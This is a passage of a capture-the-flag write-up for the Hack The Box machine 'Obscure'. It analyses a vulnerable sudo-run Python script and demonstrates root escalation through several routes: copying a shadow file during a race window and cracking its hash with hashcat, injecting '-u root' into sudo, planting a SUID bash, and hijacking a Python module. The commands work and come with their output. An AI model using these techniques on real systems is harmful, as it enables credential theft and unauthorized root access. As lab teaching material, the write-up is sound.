+Warning: Permanently added '10.10.10.168' (ECDSA) to the list of known hosts.
+robert@10.10.10.168's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Dec  1 19:34:50 UTC 2019
+
+  System load:  0.0               Processes:             109
+  Usage of /:   45.6% of 9.78GB   Users logged in:       0
+  Memory usage: 8%                IP address for ens160: 10.10.10.168
+  Swap usage:   0%
+
+
+40 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Tue Nov 26 16:05:36 2019 from 10.10.14.4
+</span><span class="gp">robert@obscure:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>And grad <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">e4493782************************
+</span></code></pre></div></div>
+<h2 id="priv-robert--root">Priv: robert –&gt; root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>Now as robert I can access the <code class="language-plaintext highlighter-rouge">BetterSSH</code> directory to find <code class="language-plaintext highlighter-rouge">BetterSSH.py</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~/BetterSSH$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 4
+-rwxr-xr-x 1 root root 1805 Oct  5  2019 BetterSSH.py
+</span></code></pre></div></div>
+<p>robert can’t edit this file, as it’s owned by and only editable by root. robert can run it with <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~/BetterSSH$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for robert on obscure:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User robert may run the following commands on obscure:
+    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+</span></code></pre></div></div>
+<h3 id="source-analysis">Source Analysis</h3>
+<p>I do have the source here as well:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">random</span><span class="p">,</span> <span class="n">string</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">crypt</span>
+<span class="kn">import</span> <span class="n">traceback</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+
+<span class="n">path</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">user</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">authenticated</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter username: </span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">passW</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter password: </span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/etc/shadow</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">[(</span><span class="n">p</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span> <span class="k">if</span> <span class="sh">"</span><span class="s">$</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">p</span> <span class="k">else</span> <span class="bp">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span>
+    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">passwords</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+    <span class="n">passwordFile</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">])</span> 
+    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp/SSH/</span><span class="sh">'</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">passwordFile</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(.</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">salt</span> <span class="o">=</span> <span class="sh">""</span>
+    <span class="n">realPass</span> <span class="o">=</span> <span class="sh">""</span>
+    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">]:</span>
+            <span class="n">salt</span><span class="p">,</span> <span class="n">realPass</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">$</span><span class="sh">'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+            <span class="k">break</span>
+
+    <span class="k">if</span> <span class="n">salt</span> <span class="o">==</span> <span class="sh">""</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Invalid user</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp/SSH/</span><span class="sh">'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">salt</span> <span class="o">=</span> <span class="sh">'</span><span class="s">$6$</span><span class="sh">'</span><span class="o">+</span><span class="n">salt</span><span class="o">+</span><span class="sh">'</span><span class="s">$</span><span class="sh">'</span>
+    <span class="n">realPass</span> <span class="o">=</span> <span class="n">salt</span> <span class="o">+</span> <span class="n">realPass</span>
+
+    <span class="nb">hash</span> <span class="o">=</span> <span class="n">crypt</span><span class="p">.</span><span class="nf">crypt</span><span class="p">(</span><span class="n">passW</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">hash</span> <span class="o">==</span> <span class="n">realPass</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Authed!</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">authenticated</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Incorrect pass</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp/SSH/</span><span class="sh">'</span><span class="o">+</span><span class="n">path</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp/SSH/</span><span class="sh">'</span><span class="p">,</span><span class="n">path</span><span class="p">))</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="n">traceback</span><span class="p">.</span><span class="nf">print_exc</span><span class="p">()</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">authenticated</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s">@Obscure$ </span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">sudo</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-u</span><span class="sh">'</span><span class="p">,</span>  <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">]]</span>
+        <span class="n">cmd</span><span class="p">.</span><span class="nf">extend</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">))</span>
+        <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
+        <span class="n">o</span><span class="p">,</span><span class="n">e</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="nf">communicate</span><span class="p">()</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Output: </span><span class="sh">'</span> <span class="o">+</span> <span class="n">o</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">))</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Error: </span><span class="sh">'</span>  <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">))</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="nf">print</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+</code></pre></div></div>
+<p>This script:</p>
+<ul>
+<li>Creates a random path name.</li>
+<li>Reads a username and password from the user.</li>
+<li>Reads <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, pulls out lines that contain <code class="language-plaintext highlighter-rouge">$</code>, and writes it to <code class="language-plaintext highlighter-rouge">/tmp/SSH/[random path]</code>.</li>
+<li>Sleep for .1 second.</li>
+<li>Loops over each row from the trimmed <code class="language-plaintext highlighter-rouge">shadow</code> file, and checks each hash against the hash of the input password. On success, it sets <code class="language-plaintext highlighter-rouge">session['authenticated'] = 1</code>. On failure, it removes the temp <code class="language-plaintext highlighter-rouge">shadow</code> file and exits.</li>
+<li>Removes the temp <code class="language-plaintext highlighter-rouge">shadow</code> file.</li>
+<li>Enters an infinite loop of reading a command, executing it and displaying results.</li>
+</ul>
+<h3 id="run-betterssh">Run BetterSSH</h3>
+<p>Running <code class="language-plaintext highlighter-rouge">BetterSSH</code> actually results in an error because on clean reset the <code class="language-plaintext highlighter-rouge">/tmp/SSH</code> directory doesn’t exist:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<span class="go">Enter username: robert
+Enter password: SecThruObsFTW
+Traceback (most recent call last):
+  File "/home/robert/BetterSSH/BetterSSH.py", line 24, in &lt;module&gt;
+    with open('/tmp/SSH/'+path, 'w') as f:
+FileNotFoundError: [Errno 2] No such file or directory: '/tmp/SSH/Szk9OZU8'
+</span></code></pre></div></div>
+<p>I’ll create that directory, and then I can auth as robert and run commands as robert (which isn’t exciting since I am already robert):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">mkdir</span> /tmp/SSH
+<span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<span class="go">Enter username: robert
+Enter password: SecThruObsFTW
+Authed!
+</span><span class="gp">robert@Obscure:~$</span><span class="w"> </span><span class="nb">id</span>  
+<span class="go">Output: uid=1000(robert) gid=1000(robert) groups=1000(robert),4(adm),24(cdrom),30(dip),46(plugdev)
+
+
+</span><span class="gp">robert@Obscure:~$</span><span class="w"> </span><span class="nb">exit</span>
+<span class="go">Output: 
+Error: sudo: exit: command not found
+
+</span><span class="gp">robert@Obscure:~$</span><span class="w"> </span>^CTraceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+<span class="go">  File "/home/robert/BetterSSH/BetterSSH.py", line 57, in &lt;module&gt;
+    command = input(session['user'] + "@Obscure$ ")
+KeyboardInterrupt
+</span></code></pre></div></div>
+<p>If I fail auth, I’m dropped out:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:</span>~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<span class="gp">Enter username:</span><span class="w"> </span>root
+<span class="gp">Enter password:</span><span class="w"> </span>root
+<span class="go">Incorrect pass
+</span></code></pre></div></div>
+<h3 id="path-1-shadow-race-condition">Path 1: shadow Race Condition</h3>
+<p>What I believe is the intended path here is to take advantage of the fact that the script writes a copy of the <code class="language-plaintext highlighter-rouge">shadow</code> file to disk, sleeps and does other work, and then deletes it. That means there’s a time in which I can read it if the permissions aren’t set right.</p>
+<p>I’ll run to constantly be trying to copy whatever is in <code class="language-plaintext highlighter-rouge">/tmp/SSH</code> to <code class="language-plaintext highlighter-rouge">/dev/shm</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">cp</span> <span class="nt">-R</span> /tmp/SSH/<span class="k">*</span> /dev/shm/ 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+<p>I’ll SSH in to get another terminal as robert and run <code class="language-plaintext highlighter-rouge">BetterSSH.py</code>​, and afterwards, there’s a file in <code class="language-plaintext highlighter-rouge">/dev/shm/SSH/</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:/dev/shm$</span><span class="w"> </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<span class="go">Enter username: 
+Enter password: 
+Invalid user
+</span><span class="gp">robert@obscure:/dev/shm$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">PMcu46FZ
+</span></code></pre></div></div>
+<p>In the file, there’s hashes (and a lot of extra whitespace):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:/dev/shm$</span><span class="w"> </span><span class="nb">cat </span>PMcu46FZ 
+<span class="go">root
+</span><span class="gp">$6$riekpK4m$</span>uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
+<span class="go">18226
+0
+99999
+7
+
+
+
+
+robert
+$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
+18163
+0
+99999
+7
+</span></code></pre></div></div>
+<p>I can crack that easily in <code class="language-plaintext highlighter-rouge">hashcat</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>hashcat <span class="nt">-m</span> 1800 <span class="nt">-a</span> 0 <span class="nt">-o</span> root.cracked shadow /usr/share/wordlists/rockyou.txt <span class="nt">--force</span>
+<span class="go">...[snip]...
+</span><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">cat </span>root.cracked 
+<span class="go">$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:mercedes
+</span></code></pre></div></div>
+<p>Now I can <code class="language-plaintext highlighter-rouge">su</code> and get a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:/dev/shm$</span><span class="w"> </span>su -
+<span class="go">Password: 
+</span><span class="gp">root@obscure:~#</span><span class="w">
+</span></code></pre></div></div>
+<p>And get <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@obscure:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">512fd442************************
+</span></code></pre></div></div>
+<h3 id="path-2-inject-into-sudo">Path 2: Inject into sudo</h3>
+<p>Looking more closely at what happens when auth is successful, it enters this loop:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s">@Obscure$ </span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">sudo</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-u</span><span class="sh">'</span><span class="p">,</span>  <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">]]</span>
+    <span class="n">cmd</span><span class="p">.</span><span class="nf">extend</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">))</span>
+    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
+    <span class="n">o</span><span class="p">,</span><span class="n">e</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="nf">communicate</span><span class="p">()</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Output: </span><span class="sh">'</span> <span class="o">+</span> <span class="n">o</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Error: </span><span class="sh">'</span>  <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">))</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="nf">print</span><span class="p">(</span><span class="sh">''</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The string passed to <code class="language-plaintext highlighter-rouge">subprocess.Popen</code> is <code class="language-plaintext highlighter-rouge">sudo -u [user] [user input]</code>. The trick here is to pass a second <code class="language-plaintext highlighter-rouge">-u root</code> before the rest of the command. To demonstrate, my local kali host has a user, df:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> <span class="nb">df id</span>
+<span class="go">uid=1000(df) gid=1000(df) groups=1000(df),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),132(scanner)
+</span><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> <span class="nb">df</span> <span class="nt">-u</span> root <span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>So, I’ll run the program normally, auth as robert, but then use it to read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:/dev/shm$</span><span class="w"> </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<span class="go">Enter username: robert
+Enter password: SecThruObsFTW
+Authed!
+</span><span class="gp">robert@Obscure$</span><span class="w"> </span><span class="nt">-u</span> root <span class="nb">cat</span> /root/root.txt
+<span class="go">Output: 512fd442************************
+</span></code></pre></div></div>
+<p>I could easily get a shell from here. For example, I can make a SUID <code class="language-plaintext highlighter-rouge">bash</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<span class="gp">Enter username:</span><span class="w"> </span>robert
+<span class="gp">Enter password:</span><span class="w"> </span>SecThruObsFTW
+<span class="go">Authed!
+robert@Obscure$ -u root cp /bin/bash /tmp/.0xdf
+Output: 
+
+robert@Obscure$ -u root chmod 4755 /tmp/.0xdf
+Output: 
+
+robert@Obscure$ ^CTraceback (most recent call last):
+  File "/home/robert/BetterSSH/BetterSSH.py", line 57, in &lt;module&gt;
+    command = input(session['user'] + "@Obscure$ ")
+KeyboardInterrupt
+</span></code></pre></div></div>
+<p>Now run it with <code class="language-plaintext highlighter-rouge">-p</code> to keep priv:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:/tmp$</span><span class="w"> </span>./.0xdf <span class="nt">-p</span>
+<span class="gp">.0xdf-4.4#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1000(robert) gid=1000(robert) euid=0(root) groups=1000(robert),4(adm),24(cdrom),30(dip),46(plugdev)
+</span></code></pre></div></div>
+<h3 id="patched-path-3-path-hijack">Patched Path 3: PATH Hijack</h3>
+<p>At the time of release, the <code class="language-plaintext highlighter-rouge">BetterSSH</code> directory was writable by robert:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ld</span> BetterSSH/
+<span class="go">drwxrwxrwx 2 root root 4096 Dec  2 09:47 BetterSSH/
+</span></code></pre></div></div>
+<p>Python always tries to load libraries from the directory containing the main file first, before checking the Python directories. So if I create a <code class="language-plaintext highlighter-rouge">subprocess.py</code> in that directory that is just a shell, I can then run <code class="language-plaintext highlighter-rouge">BetterSSH</code> and get a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~/BetterSSH$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'import os; os.system("/bin/bash")'</span> <span class="o">&gt;</span> subprocess.py
+<span class="gp">robert@obscure:~/BetterSSH$</span><span class="w"> </span><span class="nb">sudo</span> /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<span class="gp">root@obscure:~/BetterSSH#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>This was patched at some point between December 2019 and now (hopefully someday HTB will keep a <a href="https://www.hackthebox.eu/home/ideas/167?page=1">public patch log</a>) by removing write permissions from the <code class="language-plaintext highlighter-rouge">BetterSSH</code> directory for non-root users.</p>
+<h3 id="patched-path-4-lxd">Patched Path 4: lxd</h3>
+<p>At the time of release, robert was in the lxd group:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1000(robert) gid=1000(robert) groups=1000(robert),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
+</span></code></pre></div></div>
+<p>There’s a privesc here that I showed (in poor detail) as a patched privesc on <a href="/2019/01/05/htb-mischief.html#option-3---lxc-patched">Mischief</a>. I’ll do a more complete job here.</p>
+<p>The idea is to create a container on the system, then load it with the root of the file system mounted into the container. Because I have root in the container, I have root access to the entire host file system.</p>
+<p>I’ll check if there are any containers on the system already, but there are none:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">robert@obscure:~$</span><span class="w"> </span>lxc image list
+<span class="go">+-------+-------------+--------+-------------+------+------+-------------+
+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
++-------+-------------+--------+-------------+------+------+-------------+
+</span></code></pre></div></div>
+<p>On a network connected box, I could just pull one in building it. I’ll need to upload something. The smallest option I know of is <a href="https://github.com/saghul/lxd-alpine-builder">LXD Alpine Linux image builder</a>. I’ll <code class="language-plaintext highlighter-rouge">git clone</code> it into <code class="language-plaintext highlighter-rouge">/opt</code> on my local machine, go into the direction, and run the builder:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt/lxd-alpine-builder#</span><span class="w"> </span>./build-alpine
+<span class="go">Determining the latest release... v3.11
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.11/main/x86_64
+Downloading alpine-mirrors-3.5.10-r0.apk 
+...[snip]...
+(1/19) Installing musl (1.1.24-r2)
+(2/19) Installing busybox (1.31.1-r9)
+Executing busybox-1.31.1-r9.post-install
+(3/19) Installing alpine-baselayout (3.2.0-r3)
+Executing alpine-baselayout-3.2.0-r3.pre-install
+Executing alpine-baselayout-3.2.0-r3.post-install
+(4/19) Installing openrc (0.42.1-r2)
+Executing openrc-0.42.1-r2.post-install
+(5/19) Installing alpine-conf (3.8.3-r6)
+(6/19) Installing libcrypto1.1 (1.1.1g-r0)
+(7/19) Installing libssl1.1 (1.1.1g-r0)
+(8/19) Installing ca-certificates-cacert (20191127-r1)
+(9/19) Installing libtls-standalone (2.9.1-r0)
+(10/19) Installing ssl_client (1.31.1-r9)
+(11/19) Installing zlib (1.2.11-r3)
+(12/19) Installing apk-tools (2.10.5-r0)
+(13/19) Installing busybox-suid (1.31.1-r9)
+(14/19) Installing busybox-initscripts (3.2-r2)
+Executing busybox-initscripts-3.2-r2.post-install
+(15/19) Installing scanelf (1.2.4-r0)
+(16/19) Installing musl-utils (1.1.24-r2)
+(17/19) Installing libc-utils (0.7.2-r0)
+(18/19) Installing alpine-keys (2.1-r2)
+(19/19) Installing alpine-base (3.11.6-r0)
+Executing busybox-1.31.1-r9.trigger
+OK: 8 MiB in 19 packages
+</span></code></pre></div></div>
+<p>This results in a <code class="language-plaintext highlighter-rouge">.tar.gz</code> file:</p>
